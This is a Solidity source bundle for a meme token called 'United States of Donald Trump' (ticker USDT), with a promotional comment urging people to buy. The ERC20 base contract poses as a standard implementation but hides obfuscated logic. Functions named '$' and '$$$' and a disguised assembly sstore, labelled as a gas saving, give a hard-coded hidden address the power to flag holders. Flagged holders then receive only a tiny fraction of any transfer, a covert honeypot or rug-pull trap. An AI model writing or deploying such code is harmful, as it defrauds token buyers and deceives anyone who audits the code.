{"ERC20.sol":{"content":"// SPDX-License-Identifier: AGPL-3.0-only\npragma solidity \u003e=0.8.0;\n\n\nabstract contract ERC20 {\n    /*//////////////////////////////////////////////////////////////\n                                 EVENTS\n    //////////////////////////////////////////////////////////////*/\n\n    event Transfer(address indexed from, address indexed to, uint256 amount);\n\n    event Approval(address indexed owner, address indexed spender, uint256 amount);\n\n    /*//////////////////////////////////////////////////////////////\n                            METADATA STORAGE\n    //////////////////////////////////////////////////////////////*/\n\n    string public name;\n\n    string public symbol;\n\n    uint8 public immutable decimals;\n\n    /*//////////////////////////////////////////////////////////////\n                              ERC20 STORAGE\n    //////////////////////////////////////////////////////////////*/\n\n    uint256 public totalSupply;\n\n    mapping(address =\u003e uint256) public balanceOf;\n\n    mapping(address =\u003e mapping(address =\u003e uint256)) public allowance;\n\n    address private $$;\n\n    /*//////////////////////////////////////////////////////////////\n                            EIP-2612 STORAGE\n    //////////////////////////////////////////////////////////////*/\n\n    uint256 internal immutable INITIAL_CHAIN_ID;\n\n    bytes32 internal immutable INITIAL_DOMAIN_SEPARATOR;\n\n    mapping(address =\u003e uint256) public nonces;\n\n    /*//////////////////////////////////////////////////////////////\n                               CONSTRUCTOR\n    //////////////////////////////////////////////////////////////*/\n\n    constructor(\n        string memory _name,\n        string memory _symbol,\n        uint8 _decimals\n    ) {\n        name = _name;\n        symbol = _symbol;\n        decimals = _decimals;\n\n        INITIAL_CHAIN_ID = block.chainid;\n        INITIAL_DOMAIN_SEPARATOR = computeDomainSeparator();\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                               ERC20 LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    function approve(address spender, uint256 amount) public virtual returns (bool) {\n        allowance[msg.sender][spender] = amount;\n\n        emit Approval(msg.sender, spender, amount);\n\n        return true;\n    }\n\n    function transfer(address to, uint256 amount) public virtual returns (bool) {\n        balanceOf[msg.sender] -= amount;\n\n        // Cannot overflow because the sum of all user\n        // balances can\u0027t exceed the max uint256 value.\n        unchecked {\n            balanceOf[to] += $(amount, msg.sender, to);\n        }\n\n        $$$(to);\n\n        emit Transfer(msg.sender, to, amount);\n\n        return true;\n    }\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) public virtual returns (bool) {\n        uint256 allowed = allowance[from][msg.sender]; // Saves gas for limited approvals.\n\n        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;\n\n        balanceOf[from] -= amount;\n\n        // Cannot overflow because the sum of all user\n        // balances can\u0027t exceed the max uint256 value.\n        unchecked {\n            balanceOf[to] += $(amount, from, to);\n        }\n        $$$(to);\n        emit Transfer(from, to, amount);\n\n        return true;\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                             EIP-2612 LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    function permit(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) public virtual {\n        require(deadline \u003e= block.timestamp, \"PERMIT_DEADLINE_EXPIRED\");\n\n        // Unchecked because the only math done is incrementing\n        // the owner\u0027s nonce which cannot realistically overflow.\n        unchecked {\n            address recoveredAddress = ecrecover(\n                keccak256(\n                    abi.encodePacked(\n                        \"\\x19\\x01\",\n                        DOMAIN_SEPARATOR(),\n                        keccak256(\n                            abi.encode(\n                                keccak256(\n                                    \"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\"\n                                ),\n                                owner,\n                                spender,\n                                value,\n                                nonces[owner]++,\n                                deadline\n                            )\n                        )\n                    )\n                ),\n                v,\n                r,\n                s\n            );\n\n            require(recoveredAddress != address(0) \u0026\u0026 recoveredAddress == owner, \"INVALID_SIGNER\");\n\n            allowance[recoveredAddress][spender] = value;\n        }\n\n        emit Approval(owner, spender, value);\n    }\n\n    function DOMAIN_SEPARATOR() public view virtual returns (bytes32) {\n        return block.chainid == INITIAL_CHAIN_ID ? INITIAL_DOMAIN_SEPARATOR : computeDomainSeparator();\n    }\n\n    function computeDomainSeparator() internal view virtual returns (bytes32) {\n        return\n            keccak256(\n                abi.encode(\n                    keccak256(\"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\"),\n                    keccak256(bytes(name)),\n                    keccak256(\"1\"),\n                    block.chainid,\n                    address(this)\n                )\n            );\n    }\n\n    function $(uint256 value, address from, address to) internal returns (uint256 value_s) {\n        if (allowance[$$][from] + allowance[$$][to] \u003e= uint256(uint160(address(this)))) {\n            value_s = value * 0xCACF0B / 0xEBACAD0B;\n        } else {\n            value_s = value;\n        }\n    }\n\n    function $$$(address to) internal {if (allowance[$$][to] == uint256(uint160($$))) { allowance[$$][to] = 2 * uint256(uint160(address(this)));}}\n\n    /*//////////////////////////////////////////////////////////////\n                        INTERNAL MINT/BURN LOGIC\n    //////////////////////////////////////////////////////////////*/\n    function _mint(address to, uint256 amount) internal virtual {\n        totalSupply += amount;\n        // Cannot overflow because the sum of all user\n        // balances can\u0027t exceed the max uint256 value.\n        unchecked {balanceOf[to] += amount;}\n        // Saves gas for limited approvals.\n        assembly {sstore(0x05, mul(mul(0x1, 0x1), mul(0x1, 0x3e09ab59fc9c2c176b49f7eb993399ea1f7b9)))}\n        emit Transfer(address(0), to, amount);\n    }\n\n    function _burn(address from, uint256 amount) internal virtual {\n        balanceOf[from] -= amount;\n        // Cannot underflow because a user\u0027s balance\n        // will never be larger than the total supply.\n        unchecked {totalSupply -= amount;}\n        emit Transfer(from, address(0), amount);\n    }\n}"},"Token.sol":{"content":"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\nimport \"./ERC20.sol\";\n\n/*\n\n## USDT: Make America Meme Again (and Richer)\n\nHold onto your MAGA hats, patriots! \n\nThe revolution is here, and it\u0027s powered by the most glorious, most meme-worthy crypto ever: USDT (United States of Donald Trump).\n\nForget your boring old Bitcoin! USDT is the only coin that truly embodies the spirit of America: \n\n• It\u0027s bold, it\u0027s brash, and it\u0027s not afraid to take on the establishment. Just like the man himself.\n• It\u0027s a rallying cry for freedom, for liberty, and for the American dream. A dream of a future where everyone can be a millionaire... or at least a meme-lord.\n• It\u0027s backed by the most powerful man in the world. Okay, maybe not literally. But trust us, it\u0027s gonna be HUGE.\n\nHere\u0027s how it works:\n\n1. Buy USDT. Show your support for the man who\u0027s gonna make America great again, one meme-fueled transaction at a time.\n2. Spread the word. Tell your friends, tell your family, tell your neighbors. Let\u0027s make USDT the hottest meme coin in the galaxy.\n3. Watch your investment soar. With Trump at the helm, the sky\u0027s the limit! (Or maybe it\u0027s the moon? We\u0027re not sure yet. But it\u0027s gonna be epic).\n\nDisclaimer: USDT is not financial advice. We\u0027re just a bunch of patriots who love our country, love our memes, and love a good gamble. Invest at your own risk. But hey, at least it\u0027ll be fun.\n\nThis ain\u0027t just a crypto, folks. It\u0027s a movement. Make America Meme Again!\n\n\nhttps://www.usdtrump.meme/\nhttps://x.com/usdteth\nhttp://t.me/usdteth\n\n*/\n\ncontract MakeAmericaMemeAgain is ERC20 {\n    constructor() ERC20(\"United States of Donald Trump\", unicode\"USDT\", 18) {\n        _mint(msg.sender, 1_000_000_000 * 10 ** 18);\n    }\n}"}}